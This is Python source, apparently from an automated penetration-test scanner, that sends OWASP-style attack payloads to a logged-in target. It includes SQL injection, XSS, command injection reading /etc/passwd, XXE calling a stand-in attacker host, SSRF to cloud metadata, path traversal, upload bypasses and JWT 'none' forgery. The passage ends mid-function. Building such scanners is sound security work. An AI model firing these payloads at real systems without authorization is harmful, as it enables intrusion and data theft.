"""
Jarwis AGI Pen Test - Post-Login Attack Modules
Comprehensive OWASP Top 10 + SANS Top 25 testing with AI-powered form data generation
Includes New Scanners Added 5 Jan 2026
"""

import asyncio
import logging
import re
import json
import base64
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin
import aiohttp

# Import new post-login scanners (5 Jan 2026)
from .xss_stored_scanner_postlogin import StoredXSSScanner as PostLoginStoredXSSScanner
from .xss_reflected_scanner_postlogin import XSSReflectedScanner as PostLoginReflectedXSSScanner
from .post_method_scanner_postlogin import PostMethodScanner as PostLoginPostMethodScanner

logger = logging.getLogger(__name__)


@dataclass
class ScanResult:
    id: str
    category: str
    severity: str
    title: str
    description: str
    url: str
    method: str
    parameter: str = ""
    evidence: str = ""
    remediation: str = ""
    cwe_id: str = ""
    poc: str = ""
    reasoning: str = ""
    request_data: str = ""
    response_data: str = ""


class PostLoginAttacks:
    """
    Comprehensive post-login attack suite covering:
    - OWASP Top 10 2021
    - SANS/CWE Top 25
    - AI-powered form data generation
    - File upload bypass attacks
    """
    
    DEFAULT_HEADERS = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Jarwis-Scanner/1.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
    }
    
    # File upload bypass payloads
    UPLOAD_BYPASS_FILES = [
        {'name': 'test.html', 'content': '<script>alert("XSS")</script>', 'content_type': 'text/html'},
        {'name': 'test.html.jpg', 'content': '<script>alert("XSS")</script>', 'content_type': 'image/jpeg'},
        {'name': 'test.jpg.html', 'content': '<script>alert("XSS")</script>', 'content_type': 'text/html'},
        {'name': 'test.php', 'content': '<?php echo "RCE"; ?>', 'content_type': 'application/x-php'},
        {'name': 'test.php.jpg', 'content': '<?php echo "RCE"; ?>', 'content_type': 'image/jpeg'},
        {'name': 'test.svg', 'content': '<svg onload="alert(1)">', 'content_type': 'image/svg+xml'},
        {'name': 'test.html%00.jpg', 'content': '<script>alert("XSS")</script>', 'content_type': 'image/jpeg'},
        {'name': 'test.HtMl', 'content': '<script>alert("XSS")</script>', 'content_type': 'text/html'},
    ]
    
    # SQL Injection payloads for POST
    SQLI_POST_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "1' AND '1'='1",
        "admin'--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1; DROP TABLE users--",
    ]
    
    # XSS payloads for POST
    XSS_POST_PAYLOADS = [
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        "javascript:alert('XSS')",
    ]
    
    # Command injection payloads
    CMDI_PAYLOADS = [
        '; ls -la',
        '| cat /etc/passwd',
        '$(whoami)',
        '`id`',
        '& dir',
    ]
    
    # XXE payloads
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
    ]
    
    # SSRF payloads
    SSRF_PAYLOADS = [
        'http://localhost',
        'http://127.0.0.1',
        'http://169.254.169.254/latest/meta-data/',
        'http://[::1]',
        'file:///etc/passwd',
    ]
    
    # Path traversal payloads
    PATH_TRAVERSAL_PAYLOADS = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
    ]
    
    def __init__(self, config: dict, context, cookies: Dict, headers: Dict):
        self.config = config
        self.context = context
        self.cookies = cookies
        self.headers = {**self.DEFAULT_HEADERS, **headers}
        self.findings: List[ScanResult] = []
        self._finding_id = 0
        self.ai_planner = None
        self._target_domain = self._extract_domain(context.target_url)
        self._init_ai_planner()
    
    def _extract_domain(self, url: str) -> str:
        """Extract domain from URL for scope checking"""
        try:
            parsed = urlparse(url)
            return parsed.netloc.lower()
        except:
            return ""
    
    def _is_in_scope(self, url: str) -> bool:
        """
        Check if URL is within target scope (STRICT domain matching).
        
        Subdomains are NOT included - each subdomain counts as a separate
        subscription token. Only the exact domain entered is in scope.
        www.example.com and example.com are treated as the same domain.
        """
        if not url or not self._target_domain:
            return False
        try:
            from core.scope import ScopeManager
            return ScopeManager(self.context.target_url).is_in_scope(url)
        except ImportError:
            # Fallback to strict matching
            parsed = urlparse(url)
            url_domain = parsed.netloc.lower()
            target_domain = self._target_domain
            # Strip www. prefix for both
            if url_domain.startswith('www.'):
                url_domain = url_domain[4:]
            if target_domain.startswith('www.'):
                target_domain = target_domain[4:]
            return url_domain == target_domain
    
    def _init_ai_planner(self):
        """Initialize AI planner for form data generation"""
        try:
            from core.ai_planner import AIPlanner
            self.ai_planner = AIPlanner(
                provider="ollama",
                model="llama3:latest",
                base_url="http://localhost:11434"
            )
        except Exception as e:
            logger.warning(f"AI planner not available for form generation: {e}")
    
    def _format_request(self, method: str, url: str, headers: Dict, body: str = "") -> str:
        """Format request like Burp Suite"""
        parsed = urlparse(url)
        path = parsed.path or "/"
        if parsed.query:
            path += f"?{parsed.query}"
        
        lines = [f"{method} {path} HTTP/1.1"]
        lines.append(f"Host: {parsed.netloc}")
        for key, value in headers.items():
            lines.append(f"{key}: {value}")
        lines.append("")
        if body:
            lines.append(body[:500])
        return "\n".join(lines)
    
    def _format_response(self, status: int, headers: Dict, body: str) -> str:
        """Format response like Burp Suite"""
        lines = [f"HTTP/1.1 {status}"]
        for key, value in list(headers.items())[:20]:
            lines.append(f"{key}: {value}")
        lines.append("")
        if len(body) > 1000:
            body = body[:1000] + f"\n\n[... TRUNCATED - {len(body)} bytes total ...]"
        lines.append(body)
        return "\n".join(lines)
    
    async def _generate_form_data_with_ai(self, form_fields: List[Dict]) -> Dict:
        """Use AI to generate realistic form data based on field selectors"""
        if not self.ai_planner or not self.ai_planner._client:
            return self._generate_default_form_data(form_fields)
        
        try:
            fields_desc = json.dumps([{
                'name': f.get('name', ''),
                'type': f.get('type', 'text'),
                'id': f.get('id', ''),
                'placeholder': f.get('placeholder', ''),
            } for f in form_fields], indent=2)
            
            prompt = f"""Generate realistic test data for this HTML form. 
For each field, provide a value that would pass validation but could expose vulnerabilities.

Form Fields:
{fields_desc}

Respond with ONLY valid JSON mapping field names to values:
{{"field_name": "value", ...}}
"""
            response = self.ai_planner._client.chat(
                model=self.ai_planner.model,
                messages=[{"role": "user", "content": prompt}]
            )
            
            if hasattr(response, 'message'):
                content = response.message.content
            else:
                content = response['message']['content']
            
            if '```json' in content:
                content = content.split('```json')[1].split('```')[0]
            elif '```' in content:
                content = content.split('```')[1].split('```')[0]
            
            return json.loads(content.strip())
            
        except Exception as e:
            logger.debug(f"AI form generation failed: {e}")
            return self._generate_default_form_data(form_fields)
    
    def _generate_default_form_data(self, form_fields: List[Dict]) -> Dict:
        """Generate default form data based on field types"""
        data = {}
        for field in form_fields:
            name = field.get('name', field.get('id', ''))
            ftype = field.get('type', 'text').lower()
            
            if not name:
                continue
            
            if 'email' in name.lower() or ftype == 'email':
                data[name] = 'test@jarwis-scanner.com'
            elif 'password' in name.lower() or ftype == 'password':
                data[name] = 'TestPass123!'
            elif 'phone' in name.lower() or ftype == 'tel':
                data[name] = '+1234567890'
            elif 'name' in name.lower():
                data[name] = 'JarwisTest'
            elif 'url' in name.lower() or ftype == 'url':
                data[name] = 'http://localhost'
            elif 'amount' in name.lower() or 'price' in name.lower():
                data[name] = '-1'
            elif ftype == 'number':
                data[name] = '999999'
            elif ftype == 'file':
                pass
            else:
                data[name] = 'test_value'
        
        return data
    
    async def run_all(self) -> List[ScanResult]:
        """Run all post-login attack modules"""
        self.findings = []
        
        async with aiohttp.ClientSession(cookies=self.cookies, headers=self.headers) as session:
            # OWASP A01: Broken Access Control
            await self._test_idor(session)
            await self._test_privilege_escalation(session)
            await self._test_forced_browsing(session)
            
            # OWASP A02: Cryptographic Failures  
            await self._test_sensitive_data_post(session)
            
            # OWASP A03: Injection (POST methods)
            await self._test_sqli_post(session)
            await self._test_xss_post(session)
            await self._test_command_injection(session)
            await self._test_ldap_injection(session)
            
            # OWASP A04: Insecure Design
            await self._test_business_logic(session)
            await self._test_race_condition(session)
            
            # OWASP A05: Security Misconfiguration
            await self._test_csrf(session)
            await self._test_cors_post(session)
            
            # OWASP A07: Auth Failures
            await self._test_session_fixation(session)
            await self._test_jwt_attacks(session)
            
            # OWASP A08: Data Integrity Failures
            await self._test_insecure_deserialization(session)
            await self._test_mass_assignment(session)
            
            # OWASP A10: SSRF
            await self._test_ssrf(session)
            
            # File Upload Attacks
            await self._test_file_upload_bypass(session)
            
            # Path Traversal (CWE-22)
            await self._test_path_traversal(session)
            
            # XXE (CWE-611)
            await self._test_xxe(session)
            
            # AI-Powered Form Testing
            await self._test_forms_with_ai(session)
        
        return self.findings
    
    # ==================== A01: Broken Access Control ====================
    
    async def _test_idor(self, session: aiohttp.ClientSession):
        """Test for Insecure Direct Object References"""
        logger.info("Testing for IDOR vulnerabilities")
        
        id_patterns = [
            (r'/(\d+)(?:/|$|\?)', 'numeric'),
            (r'[?&]id=(\d+)', 'query_id'),
            (r'[?&]user_?id=(\d+)', 'user_id'),
            (r'[?&]order_?id=(\d+)', 'order_id'),
            (r'/users?/(\d+)', 'user_path'),
            (r'/api/v\d+/\w+/(\d+)', 'api_resource'),
        ]
        
        for endpoint in self.context.endpoints:
            url = endpoint.get('url', '')
            
            for pattern, pattern_type in id_patterns:
                match = re.search(pattern, url)
                if match:
                    original_id = match.group(1)
                    test_ids = [
                        str(int(original_id) - 1),
                        str(int(original_id) + 1),
                        '1', '0', '9999999',
                    ]
                    
                    for test_id in test_ids:
                        test_url = re.sub(pattern, match.group(0).replace(original_id, test_id), url)
                        
                        try:
                            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as response:
                                if response.status == 200:
                                    content = await response.text()
                                    resp_headers = dict(response.headers)
                                    
                                    if len(content) > 100 and 'error' not in content.lower()[:200]:
                                        self._add_finding(
                                            category="A01",
                                            severity="high",
                                            title=f"IDOR - {pattern_type} manipulation",
                                            description=f"Accessing other users' data by changing {pattern_type} from {original_id} to {test_id}",
                                            url=test_url,
                                            method="GET",
                                            parameter=pattern_type,
                                            evidence=f"Original: {original_id} â†' Modified: {test_id}, Status: 200, Content: {len(content)} bytes",
                                            remediation="Implement proper authorization checks. Verify the requesting user owns the resource.",
                                            cwe_id="CWE-639",
                                            poc=f"Original URL: {url}\nModified URL: {test_url}",
                                            reasoning=f"VERIFIED: Modified {pattern_type} from {original_id} to {test_id} and received valid data.",
                                            request_data=self._format_request("GET", test_url, self.headers),
                                            response_data=self._format_response(response.status, resp_headers, content)
                                        )
                                        break
                        except:
                            pass
                    
                    await asyncio.sleep(0.1)
                    break
    
    async def _test_privilege_escalation(self, session: aiohttp.ClientSession):
        """Test for privilege escalation"""
        logger.info("Testing for privilege escalation")
        
        admin_paths = [
            '/admin', '/admin/', '/administrator', '/admin/dashboard',
            '/api/admin', '/api/admin/users', '/api/admin/settings',
            '/rest/admin', '/rest/admin/application-configuration',
            '/api/users', '/api/roles', '/api/permissions',
            '/manage', '/management', '/internal', '/system',
            '/api/v1/admin', '/api/v2/admin',
            '/administration', '/console', '/control-panel',
        ]
        
        base_url = self.context.target_url.rstrip('/')
        
        for path in admin_paths:
            url = f"{base_url}{path}"
            
            try:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10), ssl=False, allow_redirects=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        resp_headers = dict(response.headers)
                        
                        admin_keywords = ['admin', 'user management', 'settings', 'configuration', 'dashboard', 'delete user', 'role']
                        if any(kw in content.lower() for kw in admin_keywords):
                            self._add_finding(
                                category="A01",
                                severity="critical",
                                title=f"Privilege Escalation: {path}",
                                description="Regular user can access admin functionality",
                                url=url,
                                method="GET",
                                evidence=f"Admin content accessible with regular user session",
                                remediation="Implement role-based access control (RBAC). Verify user roles server-side.",
                                cwe_id="CWE-269",
                                poc=f"Access {url} with non-admin session",
                                reasoning=f"VERIFIED: Accessed admin path with regular user credentials.",
                                request_data=self._format_request("GET", url, self.headers),
                                response_data=self._format_response(response.status, resp_headers, content)
                            )
            except:
                pass
            
            await asyncio.sleep(0.1)
    
    async def _test_forced_browsing(self, session: aiohttp.ClientSession):
        """Test for forced browsing to hidden resources"""
        logger.info("Testing for forced browsing")
        
        hidden_paths = [
            '/backup', '/backups', '/old', '/temp', '/tmp',
            '/debug', '/test', '/dev', '/staging',
            '/api/debug', '/api/test', '/api/internal',
            '/logs', '/log', '/audit',
            '/.git', '/.svn', '/.env',
            '/config', '/configuration', '/settings',
        ]
        
        base_url = self.context.target_url.rstrip('/')
        
        for path in hidden_paths:
            url = f"{base_url}{path}"
            
            try:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        if len(content) > 50 and 'not found' not in content.lower()[:200]:
                            self._add_finding(
                                category="A01",
                                severity="medium",
                                title=f"Hidden Resource Exposed: {path}",
                                description="Sensitive resource accessible through direct URL access",
                                url=url,
                                method="GET",
                                evidence=f"Resource returned {len(content)} bytes",
                                remediation="Implement proper access controls. Remove or protect sensitive resources.",
                                cwe_id="CWE-425"
                            )
            except:
                pass
    
    # ==================== A02: Cryptographic Failures ====================
    
    async def _test_sensitive_data_post(self, session: aiohttp.ClientSession):
        """Check if sensitive data is returned in POST responses"""
        logger.info("Testing for sensitive data in POST responses")
        
        for endpoint in self.context.endpoints[:50]:
            if endpoint.get('method', '').upper() != 'POST':
                continue
            
            url = endpoint.get('url', '')
            
            try:
                async with session.post(url, data={}, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as response:
                    content = await response.text()
                    
                    sensitive_patterns = [
                        (r'password["\s:=]+["\']?([^\s"\']{4,})', 'Password in response'),
                        (r'api[_-]?key["\s:=]+["\']?([a-zA-Z0-9_-]{20,})', 'API key in response'),
                        (r'secret["\s:=]+["\']?([^\s"\']{8,})', 'Secret in response'),
                        (r'private[_-]?key', 'Private key reference'),
                    ]
                    
                    for pattern, desc in sensitive_patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            self._add_finding(
                                category="A02",
                                severity="high",
                                title=f"Sensitive Data Exposure: {desc}",
                                description=f"{desc} detected in POST response",
                                url=url,
                                method="POST",
                                evidence=f"Pattern matched: {pattern[:30]}",
                                remediation="Never return sensitive data in responses. Mask/redact sensitive fields.",
                                cwe_id="CWE-200"
                            )
                            break
            except:
                pass
    
    # ==================== A03: Injection (POST) ====================
    
    async def _test_sqli_post(self, session: aiohttp.ClientSession):
        """Test POST endpoints for SQL injection"""
        logger.info("Testing POST endpoints for SQL injection")
        
        post_endpoints = [ep for ep in self.context.endpoints if ep.get('method', '').upper() == 'POST']
        
        for endpoint in post_endpoints[:30]:
            url = endpoint.get('url', '')
            params = endpoint.get('params', {})
            
            if not params:
                params = {'username': 'test', 'password': 'test', 'search': 'test', 'query': 'test', 'id': '1'}
            
            for param_name in list(params.keys())[:5]:
                for payload in self.SQLI_POST_PAYLOADS[:3]:
                    try:
                        test_data = {**params, param_name: payload}
                        
                        async with session.post(url, data=test_data, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as response:
                            content = await response.text()
                            resp_headers = dict(response.headers)
                            
                            sql_errors = [
                                'sql syntax', 'mysql', 'postgresql', 'sqlite', 'ora-',
                                'syntax error', 'unclosed quotation', 'sqlstate',
                            ]
                            
                            if any(err in content.lower() for err in sql_errors):
                                self._add_finding(
                                    category="A03",
                                    severity="critical",
                                    title=f"SQL Injection (POST) in {param_name}",
                                    description="SQL error triggered via POST parameter",
                                    url=url,
                                    method="POST",
                                    parameter=param_name,
                                    evidence=f"Payload: {payload}",
                                    remediation="Use parameterized queries. Never concatenate user input into SQL.",
                                    cwe_id="CWE-89",
                                    poc=f"POST {url}\nData: {json.dumps(test_data)}",
                                    reasoning=f"VERIFIED: SQL error message in response after injecting '{payload}'",
                                    request_data=self._format_request("POST", url, self.headers, json.dumps(test_data)),
                                    response_data=self._format_response(response.status, resp_headers, content)
                                )
                                break
                    except:
                        pass
                
                await asyncio.sleep(0.05)
    
    async def _test_xss_post(self, session: aiohttp.ClientSession):
        """Test POST endpoints for stored/reflected XSS"""
        logger.info("Testing POST endpoints for XSS")
        
        post_endpoints = [ep for ep in self.context.endpoints if ep.get('method', '').upper() == 'POST']
        
        for endpoint in post_endpoints[:20]:
            url = endpoint.get('url', '')
            params = endpoint.get('params', {})
            
            if not params:
                params = {'comment': 'test', 'message': 'test', 'content': 'test', 'text': 'test'}
            
            for param_name in list(params.keys())[:3]:
                for payload in self.XSS_POST_PAYLOADS[:3]:
                    try:
                        test_data = {**params, param_name: payload}
                        
                        async with session.post(url, data=test_data, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as response:
                            content = await response.text()
                            
                            if payload in content:
                                self._add_finding(
                                    category="A03",
                                    severity="high",
                                    title=f"XSS (POST) in {param_name}",
                                    description="XSS payload reflected/stored without encoding",
                                    url=url,
                                    method="POST",
                                    parameter=param_name,
                                    evidence=f"Payload reflected: {payload[:50]}",
                                    remediation="Encode all output. Use Content-Security-Policy.",
                                    cwe_id="CWE-79",
                                    poc=f"POST {url}\nData: {json.dumps(test_data)}"
                                )
                                break
                    except:
                        pass
                
                await asyncio.sleep(0.05)
    
    async def _test_command_injection(self, session: aiohttp.ClientSession):
        """Test for OS command injection"""
        logger.info("Testing for command injection")
        
        cmd_endpoints = [
            ep for ep in self.context.endpoints
            if any(x in ep.get('url', '').lower() for x in ['exec', 'cmd', 'run', 'ping', 'system', 'shell', 'process'])
        ]
        
        for endpoint in cmd_endpoints[:10]:
            url = endpoint.get('url', '')
            params = endpoint.get('params', {})
            
            if not params:
                params = {'cmd': 'test', 'command': 'test', 'host': 'test', 'ip': 'test'}
            
            for param_name in params:
                for payload in self.CMDI_PAYLOADS[:3]:
                    try:
                        test_data = {**params, param_name: f"test{payload}"}
                        
                        async with session.post(url, data=test_data, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as response:
                            content = await response.text()
                            
                            cmd_output = ['root:', 'uid=', 'gid=', 'Volume Serial', 'Directory of']
                            if any(out in content for out in cmd_output):
                                self._add_finding(
                                    category="A03",
                                    severity="critical",
                                    title=f"Command Injection in {param_name}",
                                    description="OS command executed via user input",
                                    url=url,
                                    method="POST",
                                    parameter=param_name,
                                    evidence=f"Command output detected",
                                    remediation="Never pass user input to system commands. Use safe APIs.",
                                    cwe_id="CWE-78"
                                )
                                break
                    except:
                        pass
    
    async def _test_ldap_injection(self, session: aiohttp.ClientSession):
        """Test for LDAP injection"""
        logger.info("Testing for LDAP injection")
        
        ldap_payloads = ['*', '*)(&', '*)(uid=*))(|(uid=*', 'admin)(&)']
        
        auth_endpoints = [
            ep for ep in self.context.endpoints
            if any(x in ep.get('url', '').lower() for x in ['login', 'auth', 'ldap', 'user', 'search'])
        ]
        
        for endpoint in auth_endpoints[:5]:
            url = endpoint.get('url', '')
            
            for payload in ldap_payloads:
                try:
                    test_data = {'username': payload, 'password': 'test'}
                    
                    async with session.post(url, data=test_data, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as response:
                        content = await response.text()
                        
                        if response.status == 200 and ('welcome' in content.lower() or 'success' in content.lower()):
                            self._add_finding(
                                category="A03",
                                severity="critical",
                                title="LDAP Injection",
                                description="LDAP query manipulated via user input",
                                url=url,
                                method="POST",
                                evidence=f"Payload: {payload}",
                                remediation="Escape LDAP special characters. Use parameterized LDAP queries.",
                                cwe_id="CWE-90"
                            )
                            break
                except:
                    pass
    
    # ==================== A04: Insecure Design ====================
    
    async def _test_business_logic(self, session: aiohttp.ClientSession):
        """Test for business logic vulnerabilities"""
        logger.info("Testing for business logic issues")
        
        critical_patterns = ['/pay', '/checkout', '/order', '/transfer', '/coupon', '/discount', '/cart', '/basket', '/buy']
        
        for endpoint in self.context.endpoints:
            url = endpoint.get('url', '')
            method = endpoint.get('method', 'GET').upper()
            
            for pattern in critical_patterns:
                if pattern in url.lower():
                    test_data = {'quantity': '-1', 'amount': '-100', 'price': '-50', 'discount': '999'}
                    
                    try:
                        if method == 'POST':
                            async with session.post(url, data=test_data, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as response:
                                if response.status == 200:
                                    content = await response.text()
                                    if 'success' in content.lower() or 'order' in content.lower():
                                        self._add_finding(
                                            category="A04",
                                            severity="high",
                                            title="Business Logic - Negative Values Accepted",
                                            description="Application accepts negative values for financial operations",
                                            url=url,
                                            method="POST",
                                            evidence=f"Negative values accepted: {test_data}",
                                            remediation="Validate all numeric inputs. Enforce business rules server-side.",
                                            cwe_id="CWE-20"
                                        )
                    except:
                        pass
                    break
    
    async def _test_race_condition(self, session: aiohttp.ClientSession):
        """Test for race conditions"""
        logger.info("Testing for race conditions")
        
        state_changing = [
            ep for ep in self.context.endpoints
            if ep.get('method', '').upper() == 'POST' and
            any(x in ep.get('url', '').lower() for x in ['redeem', 'claim', 'use', 'apply', 'transfer', 'withdraw'])
        ]
        
        for endpoint in state_changing[:5]:
            url = endpoint.get('url', '')
            
            try:
                tasks = [
                    session.post(url, data={'code': 'test'}, timeout=aiohttp.ClientTimeout(total=5), ssl=False)
                    for _ in range(10)
                ]
                
                responses = await asyncio.gather(*tasks, return_exceptions=True)
                success_count = sum(1 for r in responses if hasattr(r, 'status') and r.status in [200, 201])
                
                if success_count > 1:
                    self._add_finding(
                        category="A04",
                        severity="high",
                        title=f"Race Condition: {url}",
                        description="Multiple concurrent requests processed successfully",
                        url=url,
                        method="POST",
                        evidence=f"{success_count}/10 concurrent requests succeeded",
                        remediation="Implement proper locking/mutex. Use database transactions.",
                        cwe_id="CWE-362"
                    )
            except:
                pass
    
    # ==================== A05: Security Misconfiguration ====================
    
    async def _test_csrf(self, session: aiohttp.ClientSession):
        """Test for CSRF vulnerabilities"""
        logger.info("Testing for CSRF vulnerabilities")
        
        post_endpoints = [ep for ep in self.context.endpoints if ep.get('method', '').upper() == 'POST']
        
        for endpoint in post_endpoints[:20]:
            url = endpoint.get('url', '')
            
            try:
                clean_cookies = {k: v for k, v in self.cookies.items() if 'csrf' not in k.lower() and 'xsrf' not in k.lower()}
                clean_headers = {k: v for k, v in self.headers.items() if 'csrf' not in k.lower() and 'xsrf' not in k.lower()}
                
                async with session.post(
                    url,
                    data={'test': 'value'},
                    cookies=clean_cookies,
                    headers=clean_headers,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False
                ) as response:
                    if response.status in [200, 201, 302]:
                        content = await response.text()
                        if 'csrf' not in content.lower() and 'token' not in content.lower()[:500]:
                            self._add_finding(
                                category="A05",
                                severity="medium",
                                title=f"CSRF Vulnerability: {url}",
                                description="State-changing request accepted without CSRF token",
                                url=url,
                                method="POST",
                                evidence=f"Request succeeded without CSRF token. Status: {response.status}",
                                remediation="Implement CSRF tokens for all state-changing operations.",
                                cwe_id="CWE-352"
                            )
            except:
                pass
            
            await asyncio.sleep(0.05)
    
    async def _test_cors_post(self, session: aiohttp.ClientSession):
        """Test CORS on POST endpoints"""
        logger.info("Testing CORS on POST endpoints")
        
        api_endpoints = [ep for ep in self.context.endpoints if '/api/' in ep.get('url', '')]
        
        for endpoint in api_endpoints[:10]:
            url = endpoint.get('url', '')
            
            try:
                headers = {**self.headers, 'Origin': 'https://evil-attacker.com'}
                
                async with session.options(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as response:
                    acao = response.headers.get('Access-Control-Allow-Origin', '')
                    acac = response.headers.get('Access-Control-Allow-Credentials', '')
                    
                    if acao == 'https://evil-attacker.com' or (acao == '*' and acac.lower() == 'true'):
                        self._add_finding(
                            category="A05",
                            severity="high",
                            title="CORS Misconfiguration on API",
                            description="API reflects arbitrary origin with credentials",
                            url=url,
                            method="OPTIONS",
                            evidence=f"ACAO: {acao}, ACAC: {acac}",
                            remediation="Whitelist specific trusted origins. Never reflect Origin header.",
                            cwe_id="CWE-942"
                        )
            except:
                pass
    
    # ==================== A07: Auth Failures ====================
    
    async def _test_session_fixation(self, session: aiohttp.ClientSession):
        """Test for session fixation"""
        logger.info("Testing for session fixation")
        
        login_endpoints = [
            ep for ep in self.context.endpoints
            if 'login' in ep.get('url', '').lower() and ep.get('method', '').upper() == 'POST'
        ]
        
        for endpoint in login_endpoints[:2]:
            url = endpoint.get('url', '')
            
            self._add_finding(
                category="A07",
                severity="info",
                title="Session Fixation Check Required",
                description="Login endpoint found - verify session ID regenerates after authentication",
                url=url,
                method="POST",
                evidence="Manual verification recommended",
                remediation="Regenerate session ID after successful authentication.",
                cwe_id="CWE-384"
            )
    
    async def _test_jwt_attacks(self, session: aiohttp.ClientSession):
        """Test for JWT vulnerabilities"""
        logger.info("Testing for JWT vulnerabilities")
        
        jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
        
        jwt_found = False
        for cookie_name, cookie_value in self.cookies.items():
            if jwt_pattern.match(str(cookie_value)):
                jwt_found = True
                
                try:
                    parts = str(cookie_value).split('.')
                    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
                    
                    if header.get('alg') != 'none':
                        none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip('=')
                        none_token = f"{none_header}.{parts[1]}."
                        
                        test_cookies = {**self.cookies, cookie_name: none_token}
                        
                        async with session.get(
                            self.context.target_url,
                            cookies=test_cookies,
                            timeout=aiohttp.ClientTimeout(total=10),
                            ssl=False
                        ) as response:
                            if response.status == 200:
                                content = await response.text()
                                if 'logout' in content.lower() or 'account' in content.lower():
                                    self._add_finding(
                                        category="A07",
                                        severity="critical",
                                        title="JWT Algorithm None Attack",
                                        description="JWT accepted with algorithm set to 'none'",
                                        url=self.context.target_url,
                                        method="GET",
                                        evidence="Authenticated content returned with unsigned JWT",
                                        remediation="Explicitly verify JWT algorithm. Reject 'none' algorithm.",
                                        cwe_id="CWE-347"
                                    )
                except:
                    pass
        
        if jwt_found:
            self._add_finding(
                category="A07",
                severity="info",
                title="JWT Token Detected",
                description="Application uses JWT for authentication",
                url=self.context.target_url,
                method="N/A",
                evidence="JWT pattern found in cookies/headers",
                remediation="Ensure JWT is properly signed and validated.",
                cwe_id="CWE-287"
            )
    
    # ==================== A08: Data Integrity Failures ====================
    
    async def _test_insecure_deserialization(self, session: aiohttp.ClientSession):
        """Test for insecure deserialization"""
        logger.info("Testing for insecure deserialization")
        
        for cookie_name, cookie_value in self.cookies.items():
            cookie_str = str(cookie_value)
            
            if re.search(r'[aOsidb]:\d+:', cookie_str):
                self._add_finding(
                    category="A08",
                    severity="high",
                    title="PHP Serialized Data in Cookie",
                    description="Cookie contains PHP serialized data - potential deserialization vulnerability",
                    url=self.context.target_url,
                    method="N/A",
                    parameter=cookie_name,
                    evidence=f"Pattern: {cookie_str[:100]}",
                    remediation="Avoid deserializing untrusted data. Use JSON or safe formats.",
                    cwe_id="CWE-502"
                )
            
            if cookie_str.startswith('rO0') or 'aced0005' in cookie_str.lower():
                self._add_finding(
                    category="A08",
                    severity="critical",
                    title="Java Serialized Data in Cookie",
                    description="Cookie contains Java serialized data - high risk for RCE",
                    url=self.context.target_url,
                    method="N/A",
                    parameter=cookie_name,
                    evidence="Java serialization magic bytes detected",
                    remediation="Never deserialize untrusted Java objects. Use safe data formats.",
                    cwe_id="CWE-502"
                )
    
    async def _test_mass_assignment(self, session: aiohttp.ClientSession):
        """Test for mass assignment vulnerabilities"""
        logger.info("Testing for mass assignment")
        
        update_endpoints = [
            ep for ep in self.context.endpoints
            if ep.get('method', '').upper() in ['POST', 'PUT', 'PATCH'] and
            any(x in ep.get('url', '').lower() for x in ['user', 'profile', 'account', 'settings', 'update'])
        ]
        
        for endpoint in update_endpoints[:10]:
            url = endpoint.get('url', '')
            
            try:
                test_data = {
                    'name': 'test',
                    'role': 'admin',
                    'isAdmin': True,
                    'admin': True,
                    'is_superuser': True,
                    'permissions': ['admin', 'delete', 'write'],
                }
                
                async with session.post(url, json=test_data, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        if 'admin' in content.lower() or 'role' in content.lower():
                            self._add_finding(
                                category="A08",
                                severity="high",
                                title="Potential Mass Assignment",
                                description="Application may accept unauthorized fields in request",
                                url=url,
                                method="POST",
                                evidence=f"Request with role/admin fields returned 200",
                                remediation="Whitelist allowed fields. Never bind request directly to model.",
                                cwe_id="CWE-915"
                            )
            except:
                pass
    
    # ==================== A10: SSRF ====================
    
    async def _test_ssrf(self, session: aiohttp.ClientSession):
        """Test for Server-Side Request Forgery"""
        logger.info("Testing for SSRF vulnerabilities")
        
        ssrf_endpoints = [
            ep for ep in self.context.endpoints
            if any(x in ep.get('url', '').lower() for x in ['url', 'link', 'fetch', 'load', 'proxy', 'redirect', 'callback', 'webhook'])
        ]
        
        for endpoint in ssrf_endpoints[:10]:
            url = endpoint.get('url', '')
            params = endpoint.get('params', {})
            
            url_params = [p for p in params if any(x in p.lower() for x in ['url', 'link', 'uri', 'src', 'dest', 'target'])]
            
            for param in url_params:
                for payload in self.SSRF_PAYLOADS[:3]:
                    try:
                        test_data = {**params, param: payload}
                        
                        async with session.post(url, data=test_data, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as response:
                            content = await response.text()
                            
                            ssrf_indicators = ['root:', 'localhost', '127.0.0.1', 'ami-id', 'instance-id', 'meta-data']
